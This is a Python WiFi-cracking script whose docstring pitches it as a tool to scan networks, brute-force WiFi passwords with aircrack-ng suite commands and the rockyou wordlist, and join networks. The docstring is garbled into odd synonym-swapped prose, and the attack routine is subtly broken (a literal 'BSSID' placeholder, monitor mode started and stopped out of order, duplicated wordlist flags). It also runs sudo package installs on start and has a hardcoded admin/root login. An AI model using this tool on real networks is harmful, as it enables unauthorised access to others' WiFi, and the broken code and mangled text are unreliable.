"""
Hey there! This Python script is like a available Swiss army knife for managing WiFi stuff in your pc or computer, particularly if it's jogging Linux. With this script, you can do things like scanning for close by WiFi networks, seeking to crack passwords (yeah, it is known as bruteforcing), and connecting to WiFi networks.

**What it does:**

1. **Scanning WiFi Networks:**
   - Ever wanted to know what WiFi networks are floating around you? Well, this feature does precisely that! It'll show you all the close by WiFi networks it may find and tell you stuff like their names (SSID), in which they're hanging out (BSSID), how suitable their indicators are, and whether they are locked up tight (encryption status).

2. **Bruteforcing WiFi:**
   - Okay, so you realize those WiFi networks that have passwords? This function takes a shot at guessing those passwords. It's like trying each key within the international until you discover the one that unlocks the WiFi. It makes use of a few fancy gear known as `airmon-ng`, `wash`, `airodump-ng`, and `aircrack-ng` to do its factor. If it is a hit, it will even spill the beans and let you know the WiFi network's name (SSID) and password.

Three. **Connecting to WiFi:**
   - Ever desired to leap on a particular WiFi community but didn't have the password? This function lets you do just that! Just supply it the name of the WiFi community (SSID) and the password, and it's going to paintings its magic to get you connected. It makes use of a device called `nmcli` to make the relationship occur.

**How to Use it:**

1. **Scanning WiFi Networks:**
   - Just kind `test` and hit Enter. It'll exit and discover all the nearby WiFi networks for you.

2. **Bruteforcing WiFi:**
   - Type `bruteforce [SSID]` and hit Enter. Replace `[SSID]` with the name of the WiFi network you need to crack.

Three. **Connecting to WiFi:**
   - Type `connect [SSID]:[password]` and hit Enter. Replace `[SSID]` with the name of the WiFi network you want to hook up with, and `[password]` with the password for that community.

**A Quick Note:**
- Make certain your computer or computer is running Linux earlier than you dive into the usage of this script.
- Some of the instructions it makes use of, like `sudo` and `nmcli`, might need greater permissions or setup.
- And recollect, best use this script on WiFi networks you are allowed to debris with. Hacking into someone else's WiFi without permission is a huge no-no!
"""
# main

import os
import subprocess
import sys
import platform
import time
from colorama import init, Fore, Style
init()
os.system('sudo apt-get update')
os.system('sudo apt-get install pciutils')
os.system('sudo apt-get install network-manager')
os.system('sudo pip3 install wash')
print(Fore.RED + Style.BRIGHT + "Make sure you have installed aircrack-ng, setting up airodump-ng, airmon-ng." + Style.RESET_ALL)
time.sleep(2)

# detect platform
if platform.system() == 'Windows':
    os.system('cls')
else:
    os.system('clear')

def download_wordlist():
    try:
        wordlist_url_rockyou = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
        wordlist_filename_rockyou = "rockyou.txt"
        if not os.path.exists(wordlist_filename_rockyou):
            subprocess.run(['wget', '-O', wordlist_filename_rockyou, wordlist_url_rockyou])
            print("Wordlist (rockyou.txt) downloaded successfully!")
        else:
            print("Wordlist (rockyou.txt) already exists.")
        
        wordlist_url_new = "https://github.com/Mysteriza/WiFi-Password-Wordlist/raw/main/wifite.txt"
        wordlist_filename_new = "wifite.txt"
        if not os.path.exists(wordlist_filename_new):
            subprocess.run(['wget', '-O', wordlist_filename_new, wordlist_url_new])
            print("New wordlist (wifite.txt) downloaded successfully!")
        else:
            print("New wordlist (wifite.txt) already exists.")
    except Exception as e:
        print("Error downloading wordlists:", e)

def bruteforce_wifi(ssid):
    try:
        subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'])
        subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0mon'])
        subprocess.run(['sudo', 'wash', '-i', 'wlan0mon'])
        subprocess.run(['sudo', 'airmon-ng', 'stop', 'wlan0mon'])
        subprocess.run(['sudo', 'airmon-ng', 'stop', 'wlan0'])
        subprocess.run(['sudo', 'airodump-ng', '-w', 'output', '--essid', ssid, 'wlan0mon'])
        subprocess.run(['sudo', 'aircrack-ng', '-w', 'rockyou.txt', '-w', 'wifite.txt', '-b', 'BSSID', 'output.cap'])
        print("Bruteforcing WiFi:", ssid)
    except Exception as e:
        print("Error bruteforcing WiFi:", e)

def scan_wifi():
    try:
        result = subprocess.run(['sudo', 'iwlist', 'wlan0', 'scan'], capture_output=True, text=True)
        output = result.stdout
        networks = []
        current_network = {}
        lines = output.split('\n')
        for line in lines:
            if "Cell" in line:
                if current_network:
                    networks.append(current_network)
                    current_network = {}
                current_network["BSSID"] = line.split("Address: ")[1]
            elif "ESSID" in line:
                current_network["SSID"] = line.split("ESSID:")[1].strip('"')
            elif "Quality" in line:
                current_network["Quality"] = line.split("Quality=")[1].split(" ")[0]
                current_network["Signal Level"] = line.split("Signal level=")[1].split(" ")[0]
            elif "Encryption key" in line:
                current_network["Encryption"] = "Yes" if "on" in line else "No"
        print("Scanned WiFi networks:")
        for network in networks:
            print("SSID:", network.get("SSID", "Unknown"))
            print("BSSID:", network.get("BSSID", "Unknown"))
            print("Quality:", network.get("Quality", "Unknown"))
            print("Signal Level:", network.get("Signal Level", "Unknown"))
            print("Encryption:", network.get("Encryption", "Unknown"))
            print("-------------------------------")
    except Exception as e:
        print("Error scanning WiFi:", e)

def connect_wifi(ssid, password):
    try:
        subprocess.run(['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid, 'password', password])
        print("Connected to WiFi network:", ssid)
    except Exception as e:
        print("Error connecting to WiFi:", e)
def login():
   init()
   os.system('clear')
   usn = input(str(Fore.YELLOW + "🚀 USN > "))
   psw = input(str(Fore.YELLOW + "🚀 PSW > "))
   if usn == "admin" and psw == "root":
      main()
   else:
      print("Nice try kid 🚀")
      sys.exit()
      
def main():
    init()
    download_wordlist()
    os.system('clear')
    menu = """
        █████████████████
        █─▄▄▄▄█─█─█─▄▄▄▄█
        █▄▄▄▄─█─▄─█▄▄▄▄─█
        ▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀      

        [scan] Scan WiFi Networks
        [bruteforce] Bruteforce WiFi
        [connect] Connect to WiFi
        [usage] Guide command.
        [exit] Exit
        
        --- SHS WiFi ---
     """
    print(Fore.GREEN + menu)
    if len(sys.argv) > 1:
        if sys.argv[1].lower() == "bruteforce" and len(sys.argv) > 2:
            ssid = sys.argv[2]
            bruteforce_wifi(ssid)
            return
    else:
        while True:
            command = input(Fore.CYAN + "SHS > ").lower()
            if command == "scan":
                scan_wifi()
            elif command.startswith("bruteforce"):
                ssid = command.split(" ")[1]
                bruteforce_wifi(ssid)
            elif command.startswith("connect"):
                try:
                    ssid, password = command.split(" ")[1].split(":")
                    connect_wifi(ssid, password)
                except Exception as e:
                    print("Invalid 'connect' command format. Please use 'connect ssid:password'.")
            elif command == "usage":
                print("--- Usage ---")
                usage1="""
                [scan] Just like that, no additional comamnds
                [bruteforce] with target ssid > ( bruteforce targetssid )
                [connect] with ssid and password separated by ':' > ( connect targetssid:password12345 )

                make sure to install networkmanager, aircrack-ng, airmon-ng, airdump-ng and pywifi also you cannot use 
                this script in termux ( even if you're rooted ), if you have a laptop/computer/Chromebook ( ChromeOS ), use that.
                """
                print(usage1)
            elif command == "exit":
                break
            else:
                print("Invalid command. Please try again.")

if __name__ == "__main__":
    login()
